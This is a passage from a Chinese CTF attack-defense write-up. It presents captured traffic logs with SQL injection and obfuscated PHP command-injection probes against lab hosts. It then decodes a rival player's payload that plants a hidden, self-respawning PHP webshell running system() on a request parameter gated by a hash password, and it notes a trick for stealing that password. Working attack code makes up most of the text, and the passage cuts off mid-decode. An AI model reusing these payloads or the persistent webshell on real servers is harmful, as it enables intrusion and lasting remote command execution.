/client/user/emmm_play.class.php?emmm_cms=reg&amp;flag=ZrMlDhzjtpiKdWQnPNVyBxvw%20&apos;%20or%20select%201,2,3,4,5,(select%200xazuLSJeROvTlnChqgXmBpFckHADoKfGsbdZMPItVwirjENWQUyxY),7,8,9,10,11,12</span><br><span class="line">Host: 192.168.233.40:5005</span><br><span class="line">Content-Length: 274</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">post-data: lang=cn&amp;COL_Useremail=wqtCeoznUp%40pDusboSjcE.com&amp;COL_Useranswer=KvcuIkTRwz&amp;COL_Userproblem=%E4%BD%A0%E8%87%AA%E5%B7%B2%E7%9A%84%E7%94%9F%E6%97%A5%EF%BC%9F&amp;source=0&amp;ip=127.0.0.1&amp;COL_Userpass2=123456&amp;COL_Userpass=123456&amp;introducer=&amp;Submit=%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time: </span><br><span class="line">ip: 192.168.233.42</span><br><span class="line">POST /client/user/emmm_play.class.php?emmm_cms=login&amp;flag=edruHEyhIcsMPivmpoWxlzNjVYCFgLwSaAGDbnkt%20&apos;%20&amp;&amp;%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,(select%200xeYKCTRrMpmofFqEsdNhnZlcXDiUVSbxgzHyGuQJtIBWjvLPwkaOA)</span><br><span class="line">Host: 192.168.233.40:5005</span><br><span class="line">Content-Length: 87</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: PHPSESSID=ol9nsqdpgkli34mu4kuebohcqk</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">post-data: COL_Useremail=wqtCeoznUp%40pDusboSjcE.com&amp;COL_Userpass=123456&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time: </span><br><span class="line">ip: 192.168.233.42</span><br><span class="line">POST //client/user/emmm_play.class.php?emmm_cms=edit&amp;lang=cn</span><br><span class="line">Host: 192.168.233.40:5005</span><br><span class="line">Content-Length: 79075</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: PHPSESSID=ol9nsqdpgkli34mu4kuebohcqk</span><br><span class="line">Content-Type: multipart/form-data; boundary=ad7bceb5053a4b3ca22cd26f34b77a19</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time: </span><br><span class="line">ip: 192.168.233.42</span><br><span class="line">GET /client/user/index.php?img=../../skin/HcSLetgnrb.png</span><br><span class="line">Host: 192.168.233.40:5005</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0</span><br></pre></td></tr></table></figure><p>day2-web1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">2018/12/16 02:32:10</span><br><span class="line">GET /check?cmd=sdhABbfUTgCuIWqSnvXRjYLM.move_file(AOFyfsqBgVeoTdKtMSICEjaGbRUHL.base64_decode(file_get_content(VMZthpbqiuzURmGCDEwFHyadSPrNeWxnQsYkKXcgJAjoTlBIOvfL).zGgOeoBqwVrIjayQLUWbDinvh).SFhuxlvKbWkUwMYE HTTP/1.1</span><br><span class="line">IP：192.168.22.243</span><br><span class="line">HOST：192.168.117.100:9009:9009</span><br><span class="line">USER_AGENT：</span><br><span class="line">COOKIE：</span><br><span class="line">REFERER：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2018/12/16 02:37:02</span><br><span class="line">GET /check?cmd=MxyLYmfRiUWuqIFCVowJrOSATEgtHs &apos; &amp;&amp; select 1,2,3,4 HTTP/1.1</span><br><span class="line">IP：192.168.50.150</span><br><span class="line">HOST：192.168.117.100:9009:9009</span><br><span class="line">USER_AGENT：python-requests/2.18.4</span><br><span class="line">COOKIE：</span><br><span class="line">REFERER：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2018/12/16 02:37:02</span><br><span class="line">GET /?cmd=YfLvGKAnQNebwqpPijUu &apos; or select 1,2,3,4,5,6,7,8,9,10,11,12,(select 0xyUpKDhLVwfBtFivxAbZqEjXCQdJYMaGlozIHPnuekOcNmsgWR),14,15,16,17,18,19,20,21,22,23,24,25 HTTP/1.1</span><br><span class="line">IP：192.168.50.150</span><br><span class="line">HOST：192.168.117.100:9009:9009</span><br><span class="line">USER_AGENT：python-requests/2.18.4</span><br><span class="line">COOKIE：</span><br><span class="line">REFERER：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2018/12/16 02:37:02</span><br><span class="line">GET /users/register?cmd=irTekycoKIWSRCsfUqxBAgapl.substr(NhaVIUPfvOmuAjDgrsXJSKMixYyBZo.readdir(VnAGsifbEUZzjCw.move_file(DivqLWumQORGaTkJrC.readdir(base64_decode(fporTBYmQdAHxyuRXcIEnDFhGOkzMbLaWwNVetUvqjZPgClJKSsi).LEwjPvQxCKFOA).TEivOpdPRkrcouhzVKbeIaFUGH).OMVWBXdxNPGgAeLhS).pdrcXqohZFHW) HTTP/1.1</span><br><span class="line">IP：192.168.50.150</span><br><span class="line">HOST：192.168.117.100:9009:9009</span><br><span class="line">USER_AGENT：python-requests/2.18.4</span><br><span class="line">COOKIE：PHPSESSID=</span><br><span class="line">REFERER：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /users/register?cmd=xRVrcDLSZMUPpbXjsBiOz &apos; union select 1,2,3,4,5,6,7,(select 0xXctOkvxodFyfGUuTDgblraRziAVSYKsQJHemEjZhwPWnLICNBMqp),9,10,11,12,13,14,15 HTTP/1.1</span><br><span class="line">IP：192.168.50.150</span><br><span class="line">HOST：192.168.117.100:9009:9009</span><br><span class="line">USER_AGENT：python-requests/2.18.4</span><br><span class="line">COOKIE：PHPSESSID=</span><br><span class="line">REFERER：</span><br><span class="line">POST：username=ecCNkO&amp;confirm_password=kaljXLRHtU&amp;password=kaljXLRHtU</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2018/12/16 02:37:02</span><br><span class="line">GET /users/login HTTP/1.1</span><br><span class="line">IP：192.168.50.150</span><br><span class="line">HOST：192.168.117.100:9009:9009</span><br><span class="line">USER_AGENT：python-requests/2.18.4</span><br><span class="line">COOKIE：PHPSESSID=</span><br><span class="line">REFERER：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2018/12/16 02:37:02</span><br><span class="line">GET /users/login?cmd=bcjusDLfkrpMTwHeloSWZgqAd.file_put_contents(fhHiInvDELpKeJ.readdir(NFvnqgXMJHDE.glob(mtCEkDWycgzqnQVLaJPiZS.assert(ytvJChwoYe.fread(file_put_contents(GwLUrvORJmIPfYjVcMAuCtzBSThHZqXKb).hnrjIwBUuPexykfiWqc).HBSQthcujMYWDFPUkaAVgbivTsnN).KYsLfDbFHW).HGTMvLBkRgDmVKIso).RbIkdCSDoErKHYFqatGNjsWh) HTTP/1.1</span><br><span class="line">IP：192.168.50.150</span><br><span class="line">HOST：192.168.117.100:9009:9009</span><br><span class="line">USER_AGENT：python-requests/2.18.4</span><br><span class="line">COOKIE：PHPSESSID=</span><br><span class="line">REFERER：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /users/login?cmd=GLpMuASfsPFWiXc.fread(CBMwgWxDbtcFPjAmNnXUVovKpieaLY.fread(mzuYHcTVvraCJhXR.dirname(lwzeLcmxMbTUoXgsABfYiJ.system(zHaZomhUABCrlWPykdqbIiD.eval(system(CxrWZSDBOknpjNweauXYdAgvoPzHQJRsbGcfVtElFMyIKThUqimL).jBqTLeChVQsDxmRtIZWbgki).yMqBZgcwzXjblrAYfEUICQThnD).GkovubFLynSrixIcpJgqR).OSyBnrvoWeXuIPNpEGsARZzJ).hsjweqlXxPrDROkMEibS) HTTP/1.1</span><br><span class="line">IP：192.168.50.150</span><br><span class="line">HOST：192.168.117.100:9009:9009</span><br><span class="line">USER_AGENT：python-requests/2.18.4</span><br><span class="line">COOKIE：PHPSESSID=</span><br><span class="line">REFERER：</span><br><span class="line">POST：username=ecCNkO&amp;password=kaljXLRHtU</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2018/12/16 02:37:02</span><br><span class="line">GET /users HTTP/1.1</span><br><span class="line">IP：192.168.50.150</span><br><span class="line">HOST：192.168.117.100:9009:9009</span><br><span class="line">USER_AGENT：python-requests/2.18.4</span><br><span class="line">COOKIE：PHPSESSID=</span><br><span class="line">REFERER：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /users/editprofit?cmd=YzOLfeHKbVjZyhcwonRXtJvTpSEIu.glob(maOUqAfuQhYM.file_get_content(KrzfMtSDuExbLX.move_file(readdir(gKUYOAHyNewQkRnoJfMXBmzpjTiaGdshcCEtFbrqxVWDIvSuPLlZ).TuPQJlhNjUYARoKIDEtCsaWcLBx).vikIXSEDftUW).fPzAivYRQEcIKCXrnNs) HTTP/1.1</span><br><span class="line">IP：192.168.50.150</span><br><span class="line">HOST：192.168.117.100:9009:9009</span><br><span class="line">USER_AGENT：python-requests/2.18.4</span><br><span class="line">COOKIE：PHPSESSID=</span><br><span class="line">REFERER：</span><br><span class="line">POST：username=QwLryC&amp;email=vESrMpul%40OlZDs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2018/12/16 02:37:02</span><br><span class="line">GET /users HTTP/1.1</span><br><span class="line">IP：192.168.50.150</span><br><span class="line">HOST：192.168.117.100:9009:9009</span><br><span class="line">USER_AGENT：python-requests/2.18.4</span><br><span class="line">COOKIE：PHPSESSID=</span><br><span class="line">REFERER：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /users/editAvatar?cmd=XJqDYlazVZAxwtmNFnIyiQkGSvPcKOHoRfEWT &apos; and select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,(select 0xCUJzbVPHQLMpGZxaBDRSFdfhgcWEkryqiswlvjnTutmIAYKNXeoO),30,31,32,33,34,35 HTTP/1.1</span><br><span class="line">IP：192.168.50.150</span><br><span class="line">HOST：192.168.117.100:9009:9009</span><br><span class="line">USER_AGENT：python-requests/2.18.4</span><br><span class="line">COOKIE：PHPSESSID=</span><br><span class="line">REFERER：</span><br><span class="line">POST：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /users?cmd=OYhzfowNAdGcvpRWsUbCXqIn.dirname(ZxtIKuPJprHCifgvGLQDmTeWjEnRsd.assert(qAxgrvhSiK.move_file(UTpIhfOkulKaxSoQjzwLmHZeYtr.substr(JimRENYeHZ.dirname(assert(fldrzeIkncKqORGVTiEtuFhoNwpJAPxSyUBDCLmZvXHWQMagsjYb).mzLflHhTvrCGyjPSnNU).PuvwmptyQRWn).UcrCmvYgKjAFiXEVuIeGw).wBJClAQUGr).puUhczOWfMJQSxIyqXLEGAwnNCKDRZ) HTTP/1.1</span><br><span class="line">IP：192.168.50.150</span><br><span class="line">HOST：192.168.117.100:9009:9009</span><br><span class="line">USER_AGENT：python-requests/2.18.4</span><br><span class="line">COOKIE：PHPSESSID=</span><br><span class="line">REFERER：</span><br></pre></td></tr></table></figure></p><h1 id="沟通"><a href="#沟通" class="headerlink" title="沟通"></a>沟通</h1><p>虽然不限制外网，但是网线和wifi切换起来还是很麻烦而且时效性也是个问题。我们在队内用飞鸽传书这个内网聊天程序来解决的。也尝试了双网卡，但是还是有一点小问题。</p><h1 id="师傅们的shell"><a href="#师傅们的shell" class="headerlink" title="师傅们的shell"></a>师傅们的shell</h1><ul><li>默小西师傅的shell：<br>moxiaoxi ip:192.168.13.134</li></ul><p>他的shell同时还进行了内容检测。其实也可以破，我们清马的时候，记一下文件名，然后清完之后，给他上一个同名文件记录流量，就知道他密码了，然后搭一波顺风车~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">system(&apos;/bin/echo mo123;/bin/echo JHBhdGggPSAnL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLjRiMjIzMzFjZTg2YzhjYWEwYWRjMzcwMzkzMjZkNWZjLnBocCc7CiRjb2RlX3RlbXBsYXRlID0gIlBEOXdhSEFLSUNBZ0lDQWdJQ0FnSUNBZ2FXZHViM0psWDNWelpYSmZZV0p2Y25Rb2RISjFaU2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lITmxkRjkwYVcxbFgyeHBiV2wwS0RBcE93b2dJQ0FnSUNBZ0lDQWdJQ0FrWm1sc1pTQTlJQ0l1TkdJeU1qTXpNV05sT0Raak9HTmhZVEJoWkdNek56QXpPVE15Tm1RMVptTXVjR2h3SWpzS0lDQWdJQ0FnSUNBZ0lDQWdKSE5vWld4c0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFUTVkMkZJUVV0aFYxbHZVVU5TWmxWclZsSldWVlpVVmtaemFXRkhSbnBoUTBwa1VGUXdPVWx0V214WlYxRjNXbTFhYUUxRVFtcE5WR3hwVG0xSk1scFVTVEZhVkZsM1dtMUplbGx0VG14WmFsSnBTV2xyUzJWM2IyZEpRMEZuVVVoT05XTXpVbXhpVTJkcldERktSbFZXVmtaVk1WSmlTVzB4ZG1WSGJHaGlNMmh3VG1wWk1rbHNNSEJQZDNBNVEybzRLeWNwT3dvZ0lDQWdJQ0FnSUNBZ0lDQjFibXhwYm1zb1gxOUdTVXhGWDE4cE93b2dJQ0FnSUNBZ0lDQWdJQ0IzYUdsc1pTQW9WRkpWUlNrZ2Uzc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUm1hV3hsS1NFOVBTUnphR1ZzYkNrZ2Uzc2dabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9KR1pwYkdVc0lDUnphR1ZzYkNrN0lIMTlDaUFnSUNBZ0lDQWdJQ0FnSUhWemJHVmxjQ2cxS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmWDBLSUNBZ0lDQWdJQ0FnSUNBZ1B6ND0iOwpmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgYmFzZTY0X2RlY29kZSgkY29kZV90ZW1wbGF0ZSksIExPQ0tfRVgpOw== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base64:</span><br><span class="line">$path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;</span><br><span class="line">$code_template = &quot;PD9waHAKICAgICAgICAgICAgaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICAgICAgICAgIHNldF90aW1lX2xpbWl0KDApOwogICAgICAgICAgICAkZmlsZSA9ICIuNGIyMjMzMWNlODZjOGNhYTBhZGMzNzAzOTMyNmQ1ZmMucGhwIjsKICAgICAgICAgICAgJHNoZWxsID0gYmFzZTY0X2RlY29kZSgnUEQ5d2FIQUthV1lvUUNSZlVrVlJWVVZUVkZzaWFHRnphQ0pkUFQwOUltWmxZV1F3Wm1aaE1EQmpNVGxpTm1JMlpUSTFaVFl3Wm1JelltTmxZalJpSWlrS2V3b2dJQ0FnUUhONWMzUmxiU2drWDFKRlVWVkZVMVJiSW0xdmVHbGhiM2hwTmpZMklsMHBPd3A5Q2o4KycpOwogICAgICAgICAgICB1bmxpbmsoX19GSUxFX18pOwogICAgICAgICAgICB3aGlsZSAoVFJVRSkge3sKICAgICAgICAgICAgaWYgKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSE9PSRzaGVsbCkge3sgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRzaGVsbCk7IH19CiAgICAgICAgICAgIHVzbGVlcCg1KTsKICAgICAgICAgICAgfX0KICAgICAgICAgICAgPz4=&quot;;</span><br><span class="line">file_put_contents($path, base64_decode($code_template), LOCK_EX);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$code_template的base64解码</span><br><span class="line">&lt;?php</span><br><span class="line">            ignore_user_abort(true);</span><br><span class="line">            set_time_limit(0);</span><br><span class="line">            $file = &quot;.4b22331ce86c8caa0adc37039326d5fc.php&quot;;</span><br><span class="line">            $shell = base64_decode(&apos;PD9waHAKaWYoQCRfUkVRVUVTVFsiaGFzaCJdPT09ImZlYWQwZmZhMDBjMTliNmI2ZTI1ZTYwZmIzYmNlYjRiIikKewogICAgQHN5c3RlbSgkX1JFUVVFU1RbIm1veGlhb3hpNjY2Il0pOwp9Cj8+&apos;);</span><br><span class="line">            unlink(__FILE__);</span><br><span class="line">            while (TRUE) &#123;&#123;</span><br><span class="line">            if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125;</span><br><span class="line">            usleep(5);</span><br><span class="line">            &#125;&#125;</span><br><span class="line">            ?&gt;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">$shell 解base64：</span><br><span class="line">&lt;?php</span><br><span class="line">if(@$_REQUEST[&quot;hash&quot;]===&quot;fead0ffa00c19b6b6e25e60fb3bceb4b&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    @system($_REQUEST[&quot;moxiaoxi666&quot;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li><p>2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">system%28%27%2Fbin%2Fecho+mo123%3B%2Fbin%2Fecho+JHBhdGggPSAnL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLjRiMjIzMzFjZTg2YzhjYWEwYWRjMzcwMzkzMjZkNWZjLnBocCc7CiRjb2RlX3RlbXBsYXRlID0gIlBEOXdhSEFLSUNBZ0lDQWdJQ0FnSUNBZ2FXZHViM0psWDNWelpYSmZZV0p2Y25Rb2RISjFaU2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lITmxkRjkwYVcxbFgyeHBiV2wwS0RBcE93b2dJQ0FnSUNBZ0lDQWdJQ0FrWm1sc1pTQTlJQ0l1TkdJeU1qTXpNV05sT0Raak9HTmhZVEJoWkdNek56QXpPVE15Tm1RMVptTXVjR2h3SWpzS0lDQWdJQ0FnSUNBZ0lDQWdKSE5vWld4c0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFUTVkMkZJUVV0aFYxbHZVVU5TWmxWclZsSldWVlpVVmtaemFXRkhSbnBoUTBwa1VGUXdPVWx0V214WlYxRjNXbTFhYUUxRVFtcE5WR3hwVG0xSk1scFVTVEZhVkZsM1dtMUplbGx0VG14WmFsSnBTV2xyUzJWM2IyZEpRMEZuVVVoT05XTXpVbXhpVTJkcldERktSbFZXVmtaVk1WSmlTVzB4ZG1WSGJHaGlNMmh3VG1wWk1rbHNNSEJQZDNBNVEybzRLeWNwT3dvZ0lDQWdJQ0FnSUNBZ0lDQjFibXhwYm1zb1gxOUdTVXhGWDE4cE93b2dJQ0FnSUNBZ0lDQWdJQ0IzYUdsc1pTQW9WRkpWUlNrZ2Uzc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUm1hV3hsS1NFOVBTUnphR1ZzYkNrZ2Uzc2dabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9KR1pwYkdVc0lDUnphR1ZzYkNrN0lIMTlDaUFnSUNBZ0lDQWdJQ0FnSUhWemJHVmxjQ2cxS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmWDBLSUNBZ0lDQWdJQ0FnSUNBZ1B6ND0iOwpmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgYmFzZTY0X2RlY29kZSgkY29kZV90ZW1wbGF0ZSksIExPQ0tfRVgpOw%3D%3D+%7C+%2Fusr%2Fbin%2Fbase64+-d+%7C+%2Fbin%2Fcat+%3E+%2Fhome%2Fteam%2Fworkdir%2F%2F.4b22331ce86c8caa0adc37039326d5fc.php%3B%2Fbin%2Fecho+xiaoxi456890%27%29%3B</span><br><span class="line"></span><br><span class="line">// url decode</span><br><span class="line">system(&apos;/bin/echo mo123;/bin/echo JHBhdGggPSAnL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLjRiMjIzMzFjZTg2YzhjYWEwYWRjMzcwMzkzMjZkNWZjLnBocCc7CiRjb2RlX3RlbXBsYXRlID0gIlBEOXdhSEFLSUNBZ0lDQWdJQ0FnSUNBZ2FXZHViM0psWDNWelpYSmZZV0p2Y25Rb2RISjFaU2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lITmxkRjkwYVcxbFgyeHBiV2wwS0RBcE93b2dJQ0FnSUNBZ0lDQWdJQ0FrWm1sc1pTQTlJQ0l1TkdJeU1qTXpNV05sT0Raak9HTmhZVEJoWkdNek56QXpPVE15Tm1RMVptTXVjR2h3SWpzS0lDQWdJQ0FnSUNBZ0lDQWdKSE5vWld4c0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFUTVkMkZJUVV0aFYxbHZVVU5TWmxWclZsSldWVlpVVmtaemFXRkhSbnBoUTBwa1VGUXdPVWx0V214WlYxRjNXbTFhYUUxRVFtcE5WR3hwVG0xSk1scFVTVEZhVkZsM1dtMUplbGx0VG14WmFsSnBTV2xyUzJWM2IyZEpRMEZuVVVoT05XTXpVbXhpVTJkcldERktSbFZXVmtaVk1WSmlTVzB4ZG1WSGJHaGlNMmh3VG1wWk1rbHNNSEJQZDNBNVEybzRLeWNwT3dvZ0lDQWdJQ0FnSUNBZ0lDQjFibXhwYm1zb1gxOUdTVXhGWDE4cE93b2dJQ0FnSUNBZ0lDQWdJQ0IzYUdsc1pTQW9WRkpWUlNrZ2Uzc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUm1hV3hsS1NFOVBTUnphR1ZzYkNrZ2Uzc2dabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9KR1pwYkdVc0lDUnphR1ZzYkNrN0lIMTlDaUFnSUNBZ0lDQWdJQ0FnSUhWemJHVmxjQ2cxS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmWDBLSUNBZ0lDQWdJQ0FnSUNBZ1B6ND0iOwpmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgYmFzZTY0X2RlY29kZSgkY29kZV90ZW1wbGF0ZSksIExPQ0tfRVgpOw== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);</span><br><span class="line"></span><br><span class="line">// base64 decode</span><br><span class="line">system(&apos;/bin/echo mo123;/bin/echo $path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;</span><br><span class="line">$code_template = &quot;PD9waHAKICAgICAgICAgICAgaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICAgICAgICAgIHNldF90aW1lX2xpbWl0KDApOwogICAgICAgICAgICAkZmlsZSA9ICIuNGIyMjMzMWNlODZjOGNhYTBhZGMzNzAzOTMyNmQ1ZmMucGhwIjsKICAgICAgICAgICAgJHNoZWxsID0gYmFzZTY0X2RlY29kZSgnUEQ5d2FIQUthV1lvUUNSZlVrVlJWVVZUVkZzaWFHRnphQ0pkUFQwOUltWmxZV1F3Wm1aaE1EQmpNVGxpTm1JMlpUSTFaVFl3Wm1JelltTmxZalJpSWlrS2V3b2dJQ0FnUUhONWMzUmxiU2drWDFKRlVWVkZVMVJiSW0xdmVHbGhiM2hwTmpZMklsMHBPd3A5Q2o4KycpOwogICAgICAgICAgICB1bmxpbmsoX19GSUxFX18pOwogICAgICAgICAgICB3aGlsZSAoVFJVRSkge3sKICAgICAgICAgICAgaWYgKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSE9PSRzaGVsbCkge3sgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRzaGVsbCk7IH19CiAgICAgICAgICAgIHVzbGVlcCg1KTsKICAgICAgICAgICAgfX0KICAgICAgICAgICAgPz4=&quot;;</span><br><span class="line">file_put_contents($path, base64_decode($code_template), LOCK_EX)Ow== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);</span><br><span class="line"></span><br><span class="line">// base64 decode</span><br><span class="line">system(&apos;/bin/echo mo123;/bin/echo $path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;</span><br><span class="line">$code_template = &quot;&lt;?php</span><br><span class="line">            ignore_user_abort(true);</span><br><span class="line">            set_time_limit(0);</span><br><span class="line">            $file = &quot;.4b22331ce86c8caa0adc37039326d5fc.php&quot;;</span><br><span class="line">            $shell = 